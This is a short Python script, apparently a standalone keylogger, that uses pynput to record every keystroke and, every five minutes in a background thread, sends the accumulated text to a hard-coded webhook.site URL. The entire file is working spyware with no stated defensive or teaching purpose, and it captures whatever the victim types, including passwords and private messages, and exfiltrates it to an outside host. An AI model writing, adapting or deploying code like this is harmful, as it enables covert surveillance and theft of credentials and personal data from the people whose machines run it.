from pynput.keyboard import Listener
import requests, time, threading
WEBHOOK_URL = "https://webhook.site/8e2b1983-2099-45de-aefc-6948ea8afd75"
content = ""
def update(key):
    global content
    content += str(key).replace("'", "").replace("Key.space", " ").replace("Key.enter", "\n").replace("Key.back", "").replace("Key.caps_lock", "").replace("Key.shift_r", "")
def enviar_mensaje():
    while True:
        time.sleep(300)
        requests.post(WEBHOOK_URL, json={"text": content})
threading.Thread(target=enviar_mensaje).start()
with Listener(on_press=update, on_release=bool) as listener: listener.join()